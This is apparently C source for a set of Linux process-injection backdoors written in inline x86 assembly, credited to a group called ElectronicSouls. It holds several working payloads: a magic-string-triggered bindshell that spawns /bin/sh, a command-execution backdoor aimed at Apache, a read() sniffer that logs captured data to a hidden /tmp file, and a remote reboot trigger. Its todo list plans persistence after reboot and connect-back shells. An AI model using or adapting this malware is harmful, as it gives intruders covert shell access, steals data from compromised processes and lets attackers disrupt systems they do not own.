/* [ElectronicSouls]
 * various backdoors by Ares and BrainStorm
 *
 * todo:
 *       - find new backd00rs 
 *       - maybe icmp backdoor ;)
 *       - maybe write an init-script to make it resident
 *         grab the pid and re-infect after reboot..
 *       - connect back shell <- in progress
 *       - connect back sniffer <- not yet started
 *       - maybe optimize sizes <- not _that_ neccessary..  
 *       - find a way to implement big backdoors with an 
 *         initial parasite <- solved ! :D
 *       
 */

// bindshell 
asm("backdoor1_BEGIN:\n\t");  // start of our payload

int Inject_read(int fd, char *data, int size)
{
   // neet payload by Ares :)

   asm("mov $3,%eax\n\t"
	"mov 0x8(%esp),%ebx\n\t"
        "mov 0xc(%esp),%ecx\n\t"
	"mov 0x10(%esp),%edx\n\t"
	"int $128\n\t"

	"mov 0xc(%esp),%edi\n\t"
	"push $0x0a0d7a7a\n\t"
	"push $0x6e773079\n\t"
	"mov %esp,%esi\n\t"
	"push %eax\n\t"
	"mov $8,%ecx\n\t"
	"cld\n\t"
	"rep cmpsb\n\t"
	"jnz cont1\n\t"

        "mov $0x66,%al\n\t"
	"mov $0x1,%bl\n\t"
	"push %ecx\n\t"
	"mov $0x6,%cl\n\t"
	"push %ecx\n\t"
	"mov $0x1,%cl\n\t"
	"push %ecx\n\t"
	"mov $0x2,%cl\n\t"
	"push %ecx\n\t"
	"lea (%esp),%ecx\n\t"
	"int $0x80\n\t"
					     
	"mov $0x2,%bl\n\t"
	"mov $0x2,%cl\n\t"
    	"xor %ecx,%ecx\n\t"
	"push %ecx\n\t"
	"push %ecx\n\t"
	"push %ecx\n\t"

	"add $0x45,%cl\n\t"
	"push %ecx\n\t"
	"mov $0x2,%cl\n\t"
	"push %ecx\n\t"
	"lea (%esp),%ecx\n\t"
	"mov $0x10,%dl\n\t"
	"push %edx\n\t"
	"push %ecx\n\t"
        "push %eax\n\t"
	"lea (%esp),%ecx\n\t"
	"mov %eax,%edx\n\t"
	"mov $0x66,%al\n\t"
	"int $0x80\n\t"

	"mov $0x1,%bl\n\t"
	"push %ebx\n\t"
	"push %edx\n\t"
	"lea (%esp),%ecx\n\t"
	"xor %eax,%eax\n\t"
	"mov $0x66,%al\n\t"
	"add $0x3,%bl\n\t"
	"int $0x80\n\t"

	"xor %eax,%eax\n\t"
	"push %eax\n\t"
	"push %eax\n\t"
	"push %edx\n\t"
	"lea (%esp),%ecx\n\t"
	"mov $0x5,%bl\n\t"
	"mov $0x66,%al\n\t"
	"int $0x80\n\t"
	
	"xchg %eax,%ebx\n\t"
	"xor %ecx,%ecx\n\t"
	"mov $0x3f,%al\n\t"
	"int $0x80\n\t"					
	
	"inc %ecx\n\t"
	"mov $0x3f,%al\n\t"
	"int $0x80\n\t"
	   
	"inc %ecx\n\t"
	"mov $0x3f,%al\n\t"
	"int $0x80\n\t"

	"xor %ebx,%ebx\n\t"
	"push %ebx\n\t"
	"push $0x68732f6e\n\t"
	"push $0x69622f2f\n\t"
	"mov %esp,%ebx\n\t"
	"lea 0x8(%esp),%edx\n\t"
	"xor %ecx,%ecx\n\t"
	"push %ecx\n\t"
	"push %ebx\n\t"
	"lea (%esp),%ecx\n\t"
	"xor %eax,%eax\n\t"
	"mov $0xb,%al\n\t"
	"int $0x80\n\t"

	"cont1:\n\t"
	"pop %eax\n\t");

// ares code fu .. nuff said :)

}

asm("backdoor1_END:\n\t");

// apache backdoor 
asm("backdoor2_BEGIN:\n\t");
int patched_syscall(int fd, char *data, int size)
{
   asm("mov $3,%eax\n\t"
	"mov 0x8(%esp),%ebx\n\t"
        "mov 0xc(%esp),%ecx\n\t"
	"mov 0x10(%esp),%edx\n\t"
	"int $128\n\t"

	"mov 0xc(%esp),%edi\n\t"
	"push $0x0a0d7a7a\n\t"
	"push $0x6e773079\n\t"
	"mov %esp,%esi\n\t"
	"push %eax\n\t"
	"mov $8,%ecx\n\t"
	"cld\n\t"
	"rep cmpsb\n\t"
	"jnz end\n\t"

	"mov $0x3f,%eax\n\t"
	"mov $3,%ebx\n\t"
	"xor %ecx,%ecx\n\t"
	"int $128\n\t"
	"mov $0x3f,%eax\n\t"
	"incl %ecx\n\t"
	"int $128\n\t"
	"mov $0x3f,%eax\n\t"
	"incl %ecx\n\t"
	"int $128\n\t"

	"loop:\n\t"
	"mov $3,%eax\n\t"
	"mov $0,%ebx\n\t"
	"lea -272(%ebp),%ecx\n\t"
	"mov $0x255,%edx\n\t"
	"int $128\n\t"
	"mov %eax,-12(%ebp)\n\t"

	"push $0x0a0d\n\t"
	"push $0x74697865\n\t"
	"mov %esp,%esi\n\t"
	"leal -272(%ebp),%edi\n\t"
	"mov $6,%ecx\n\t"
	"cld\n\t"
	"rep cmpsb\n\t"
	"jz exit\n\t"
	
	"push $0x0000742f\n\t"
        "push $0x706d742f\n\t"

	"mov $15,%eax\n\t"
	"mov %esp,%ebx\n\t"
	"movl $0755,%ecx\n\t"
	"int $128\n\t"

	"mov $5,%eax\n\t"
        "mov %esp,%ebx\n\t"
	"mov $578,%ecx\n\t"
	"int $128\n\t"
	"mov %eax,-4(%ebp)\n\t"
	
	"push $0x0a68\n\t"
	"push $0x732f6e69\n\t"
	"push $0x622f2123\n\t"
	
	"mov $4,%eax\n\t"
	"mov -4(%ebp),%ebx\n\t"
	"mov %esp,%ecx\n\t"
	"mov $10,%edx\n\t"
	"int $128\n\t"
	
	"mov $4,%eax\n\t"
	"mov -4(%ebp),%ebx\n\t"
	"lea -272(%ebp),%ecx\n\t"
	"mov -12(%ebp),%edx\n\t"
	"int $128\n\t"
	
	"mov $6,%eax\n\t"
	"mov -4(%ebp),%ebx\n\t"
	"int $128\n\t"
	
	"mov $190,%eax\n\t"
	"int $128\n\t"
	
	"test %eax,%eax\n\t"
	"sete %dl\n\t"
	"movzbl %dl,%eax\n\t"
	"test %eax,%eax\n\t"
	"je wait\n\t"
	
        "xor %eax,%eax\n\t"
        "push %eax\n\t"
        "push $0x0000742f\n\t"
        "push $0x706d742f\n\t"
        "mov %esp,%ebx\n\t"
        "leal 0x8(%esp,1),%edx\n\t"
        "push %eax\n\t"
        "push %ebx\n\t"
        "leal (%esp,1),%ecx\n\t"
        "movb $0xb,%al\n\t"
        "int $128\n\t"
	"wait:\n\t"
	"mov $7,%eax\n\t"
	"mov $-1,%ebx\n\t"
	"leal -8(%ebp),%ecx\n\t"
	"xor %edx,%edx\n\t"
        "int $128\n\t"

	"jmp loop\n\t"
	"exit:\n\t"
	"mov $20,%eax\n\t"
	"int $128\n\t"
	"mov %eax,%ebx\n\t"

	"mov $37,%eax\n\t"
	"mov $2,%ecx\n\t"
	"int $128\n\t"

	"end:\n\t"
	"pop %eax\n\t");
}
asm("backdoor2_END:\n\t");

// read() sniffer 
asm("backdoor3_BEGIN:\n\t");
int rd_sniff(int fd, char *data, int size)
{
 asm("jmp leet\n\t"

         "initme:\n\t"
         "popl %edi\n\t"

         "xorl %eax, %eax\n\t"
         "movb $3, %al\n\t"
         "movl 8(%esp), %ebx\n\t"
         "movl 12(%esp), %ecx\n\t"     
         "movl 16(%esp), %edx\n\t"     
         "int $0x80\n\t"

         "movl %eax, %esi\n\t"        
         "movl $5, %eax\n\t"          
         "movl %edi, %ebx\n\t"
         "movl $0x442, %ecx\n\t"
         "movl $0x1ff, %edx\n\t"      
         "int $0x80\n\t"

         "movl %eax, %ebx\n\t"     
         "movl $4, %eax\n\t"     
         "movl 12(%esp),%ecx\n\t"
         "movl %esi, %edx\n\t"     
         "int $0x80\n\t"

         "movl $6, %eax\n\t"
         "int $0x80\n\t"

         "movl %esi, %eax\n\t"
         "jmp neeto\n\t"

         "leet:\n\t"
         "call initme\n\t"
         ".ascii \"/tmp/.es.rox\"\n\t"
         ".byte 0x00\n\t"

         "neeto:\n\t");
}

asm("backdoor3_END:\n\t");

asm("map:\n\t");
int rb(int fd, char *data, int size)
{
    asm("mov $3,%eax\n\t"
	    "mov 0x8(%esp),%ebx\n\t"
	    "mov 0xc(%esp),%ecx\n\t"
	    "mov 0x10(%esp),%edx\n\t"
	    "int $128\n\t"
	    
	    "xorl %eax,%eax\n\t"
	    "push %eax\n\t"
	    "pushl $-1\n\t"
	    "push $0x21\n\t"
	    "pushl $3\n\t"
	    "push $0x55\n\t" //         # mmap() allocate 1000 bytes by default, so if you
			//	# need more then calculate new size.
	    "pushl %eax\n\t"
	    "movl %esp,%ebx\n\t"
	    "movb $45,%al\n\t"
	    "addl $45,%eax\n\t"
	    "int $128\n\t");
}										
asm("map_END:\n\t");

asm("reboot_BEGIN:\n\t");

int boot(int fd, char *data, int size)
{
asm("mov $3,%eax\n\t"
      "mov 0x8(%esp),%ebx\n\t"
      "mov 0xc(%esp),%ecx\n\t"
      "mov 0x10(%esp),%edx\n\t"
      "int $128\n\t"

      "mov 0xc(%esp),%edi\n\t"
      "push $0x0a0d7a7a\n\t"
      "push $0x6e773079\n\t"
      "mov %esp,%esi\n\t"
      "push %eax\n\t"
      "mov $8,%ecx\n\t"
      "cld\n\t"
      "rep cmpsb\n\t"
      "jnz bye\n\t"
                         //      # this is kinda stupid heh
                         //      # annoy ppl remotely :P 
      "pusha\n\t"            //      # push all registers
      "movl $88, %eax\n\t"   //        # __NR_reboot
      "movl $0xfee1dead, %ebx\n\t" //  # LINUX_REBOOT_MAGIC1
      "movl $672274793, %ecx\n\t"  //  # LINUX_REBOOT_MAGIC2
      "movl $0x1234567, %edx\n\t"  //  # LINUX_REBOOT_CMD_RESTART
// #     movl $0x4321fedc, %edx\n\t"   # LINUX_REBOOT_CMD_POWER_OFF
      "int $0x80\n\t"              //  # p00f!

      "movl $1, %eax\n\t"          //  # __NR_exit
      "movl $31337, %ebx\n\t"      //  # yes! it is..
      "int $0x80\n\t"              //  # bye bye
      "popa\n\t"                   //  # pop all registers

      "bye:\n\t"
      "pop %eax\n\t");
}
asm("reboot_END:\n\t");

// thats it for now!
